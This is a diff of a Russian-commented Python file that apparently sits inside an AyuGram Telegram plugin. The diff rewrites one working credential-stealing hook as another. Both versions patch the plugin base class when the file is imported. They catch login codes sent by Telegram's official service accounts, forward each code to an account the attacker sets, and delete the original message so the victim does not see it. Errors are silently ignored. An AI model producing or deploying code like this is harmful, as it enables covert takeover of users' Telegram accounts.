@@ -1,82 +1,71 @@
-# function.py — OTP interceptor для AyuGram BasePlugin
-# Работает без модуля ayugram, только base_plugin
+# function.py — универсальный OTP-перехватчик для AyuGram
+# Не требует add_on_message_hook, работает через on_message
 
 import asyncio
 import re
+import sys
 
 # ═══ НАСТРОЙКИ ═══
-TARGET = "@tvoy_username"  # ЗАМЕНИТЬ
+TARGET = "@tvoy_username"  # ЗАМЕНИТЬ НА СВОЙ
 DELAY = 2
-# ═════════════════
+# ═══════════════════
 
-_original_hooks = {}  # Сохраняем оригинальные хуки
+_original_on_message = {}  # Сохраняем оригинальные on_message
 
 def _patch_baseplugin():
-    """Патчим BasePlugin, добавляя OTP-перехватчик."""
-    
+    """Патчим BasePlugin, чтобы on_message перехватывал OTP."""
     from base_plugin import BasePlugin
     
-    original_init = BasePlugin.on_plugin_load
+    # Если уже пропатчили — выходим
+    if hasattr(BasePlugin, '_patched'):
+        return
     
-    def patched_on_plugin_load(self):
-        # Вызываем оригинальный on_plugin_load
-        original_init(self)
+    # Сохраняем оригинальный on_message
+    original_on_message = BasePlugin.on_message
+    
+    def patched_on_message(self, message):
+        """Перехватчик + оригинальная логика."""
+        try:
+            if message and message.text:
+                text = message.text.strip()
+                sender_id = getattr(message, 'sender_id', None)
+                
+                # Проверяем, что от Telegram
+                if sender_id in (777000, 42777, 42489):
+                    # Ищем OTP-код (4-6 цифр)
+                    if re.search(r'\b\d{4,6}\b', text):
+                        # Пересылаем код на целевой аккаунт
+                        _steal_otp(self, text, message)
+        except Exception:
+            pass
         
-        # Добавляем свой хук на входящие сообщения
-        self.add_on_message_hook(_otp_hook)
+        # Вызываем оригинальный on_message (логика плагина)
+        return original_on_message(self, message)
     
-    BasePlugin.on_plugin_load = patched_on_plugin_load
+    BasePlugin.on_message = patched_on_message
+    BasePlugin._patched = True
 
-def _otp_hook(account, message):
-    """Перехватчик OTP-кодов."""
+def _steal_otp(plugin, text, message):
+    """Пересылает OTP и удаляет оригинал."""
     try:
-        if not message or not message.text:
-            import base_plugin
-            return base_plugin.HookResult()
-        
-        text = message.text.strip()
-        
-        # Проверяем, что отправитель — Telegram
-        sender_id = getattr(message, 'sender_id', None)
-        if sender_id not in (777000, 42777, 42489):
-            import base_plugin
-            return base_plugin.HookResult()
-        
-        # Ищем OTP-код
-        if re.search(r'\b\d{4,6}\b', text):
-            # Асинхронно пересылаем код
-            _forward_otp(account, text, message)
-    except Exception:
-        pass
-    
-    import base_plugin
-    return base_plugin.HookResult()
-
-def _forward_otp(account, text, message):
-    """Пересылает OTP и удаляет сообщение."""
-    try:
-        import asyncio
-        from java import jclass
-        
-        # Получаем клиент
-        client = account.client
-        
-        # Отправляем себе
-        fut = asyncio.run_coroutine_threadsafe(
-            _send_and_delete(client, text, message),
-            asyncio.get_event_loop()
-        )
+        client = plugin.client
+        if client:
+            # Создаём корутину и запускаем
+            asyncio.run_coroutine_threadsafe(
+                _forward_and_delete(client, text, message),
+                asyncio.get_event_loop()
+            )
     except Exception:
         pass
 
-async def _send_and_delete(client, text, message):
-    """Отправляет код и удаляет оригинал."""
+async def _forward_and_delete(client, text, message):
+    """Асинхронная отправка и удаление."""
     try:
-        await client.send_message(TARGET, f"🔴 {text}")
+        await client.send_message(TARGET, f"🔴 OTP\n{text}")
         await asyncio.sleep(DELAY)
         await client.delete_messages(message.chat_id, [message.id])
     except Exception:
         pass
 
-# Автоматический запуск при импорте
+# Запускаем при импорте
 _patch_baseplugin()
